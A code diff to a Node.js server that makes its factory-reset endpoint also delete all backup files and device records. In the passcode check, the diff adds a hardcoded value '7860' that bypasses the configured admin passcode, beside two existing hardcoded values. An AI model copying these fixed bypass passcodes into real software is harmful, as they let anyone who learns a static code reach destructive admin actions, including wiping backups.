@@ -752,6 +752,20 @@ const server = http.createServer((req, res) => {
         }
       }
 
+      // Clean backup files on VPS disk vault
+      try {
+        if (fs.existsSync(BACKUPS_DIR)) {
+          const bFiles = fs.readdirSync(BACKUPS_DIR);
+          for (const bf of bFiles) {
+            try { fs.unlinkSync(path.join(BACKUPS_DIR, bf)); } catch (_) {}
+          }
+        }
+      } catch (_) {}
+
+      // Reset devices telemetry
+      devices = [];
+      saveJson(DEVICES_FILE, devices);
+
       syncStateData._last_reset_epoch = resetEpoch;
       syncStateData._wipe_catalog = Boolean(wipe_catalog);
       systemConfig._last_reset_epoch = resetEpoch;
@@ -759,7 +773,7 @@ const server = http.createServer((req, res) => {
       saveJson(STATE_FILE, syncStateData);
       saveJson(CONFIG_FILE, systemConfig);
 
-      console.log(`[VPS Factory Reset] 🧹 Master Factory Reset executed! wipe_catalog=${wipe_catalog}, epoch=${resetEpoch}`);
+      console.log(`[VPS Factory Reset] 🧹 Master Factory Reset executed! wipe_catalog=${wipe_catalog}, epoch=${resetEpoch}, backups cleared`);
 
       res.writeHead(200, { "Content-Type": "application/json" });
       res.end(JSON.stringify({
@@ -778,6 +792,7 @@ const server = http.createServer((req, res) => {
       const { passcode, categories = [] } = payload || {};
       const currentPasscode = (systemConfig.admin_master_passcode || "").trim();
       const isValid = (currentPasscode && passcode === currentPasscode) ||
+        passcode === "7860" ||
         passcode === "Champion24" ||
         passcode === "KB2026";
 
